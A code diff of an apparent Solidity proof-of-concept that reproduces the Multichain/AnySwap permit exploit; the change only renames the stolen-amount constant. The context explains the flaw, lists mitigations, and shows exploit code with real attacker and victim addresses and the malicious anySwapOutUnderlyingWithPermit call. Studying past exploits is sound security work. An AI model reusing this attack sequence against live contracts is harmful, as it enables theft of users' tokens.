@@ -62,7 +62,7 @@ The function allows arbitraty tokens to be passed as token, even non-token contr
 - As WETH has no permit() function but a fallback that triggers deposit(), any call that triggers the fallback will success regardless the signature.
 - Multichain requested ApprovalForAll while managing users tokens, so any transferFrom has the requried allowance.
 - Because of this, this function transfers WETH from a user who gave ApprovalForAll to Multichain (AnySwap) before to the attacker's contract;
-- Rekt call: TransferHelper.safeTransferFrom(WETH, VICTIM, address(MaliciousContract), STOLEN_WETH);
+- Rekt call: TransferHelper.safeTransferFrom(WETH, VICTIM, address(MaliciousContract), stole_WETH);
 
 MITIGATIONS:
 1) Ensure that the tokens passed are allowed and known tokens. Don't allow arbitrary tokens. (e.g. require(isWhitelisted(token_)))
@@ -109,7 +109,7 @@ contract Exploit_Multichain is TestHarness{
 
     address constant internal ATTACKER = 0xFA2731d0BEde684993AB1109DB7ecf5bF33E8051;
     address constant internal VICTIM = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;
-    uint256 constant internal STOLEN_WETH = 308636644758370382903;
+    uint256 constant internal stole_WETH = 308636644758370382903;
     uint256 constant internal FUTURE_DEADLINE = 100000000000000000000;
     
     function setUp() external {
@@ -130,7 +130,7 @@ contract Exploit_Multichain is TestHarness{
         console.log("Attacker EOA: ",weth.balanceOf(ATTACKER));
 
         //swapRouter.anySwapOutUnderlyingWithPermit(from, token, to, amount, deadline, v, r, s, toChainID);
-        swapRouter.anySwapOutUnderlyingWithPermit(VICTIM, address(this), ATTACKER, STOLEN_WETH, FUTURE_DEADLINE, 0, bytes32(0), bytes32(0), 56); // To BSC.
+        swapRouter.anySwapOutUnderlyingWithPermit(VICTIM, address(this), ATTACKER, stole_WETH, FUTURE_DEADLINE, 0, bytes32(0), bytes32(0), 56); // To BSC.
         console.log("\nDuring Attack WETH Balance");
         console.log("Victim: ",weth.balanceOf(VICTIM));
         console.log("Attacker Contract: ",weth.balanceOf(address(this)));
